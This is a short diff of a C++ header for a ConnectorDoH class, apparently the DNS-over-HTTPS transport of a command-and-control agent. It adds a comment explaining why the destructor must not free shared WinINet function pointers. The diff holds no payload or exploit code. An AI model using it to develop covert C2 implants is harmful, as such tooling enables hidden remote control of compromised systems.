@@ -67,7 +67,17 @@ private:
 
 public:
     ConnectorDoH();
-    ~ConnectorDoH(); // Add destructor to clean up
+    // IMPORTANT:
+    // Do NOT free `functions` or call CloseConnector() inside the destructor.
+    //
+    // MainAgent allocates the connector with MemAllocLocal and then does
+    //   *g_Connector = ConnectorDoH();
+    // This uses a temporary ConnectorDoH object whose destructor runs
+    // immediately after the assignment. If the destructor frees shared
+    // resources (like the DOH_HTTP_FUNC block), the real g_Connector instance
+    // will be left holding dangling pointers, leading to subtle memory
+    // corruption and crashes when WinINet APIs are later invoked.
+    ~ConnectorDoH();
 
     BOOL SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize);
     void CloseConnector();
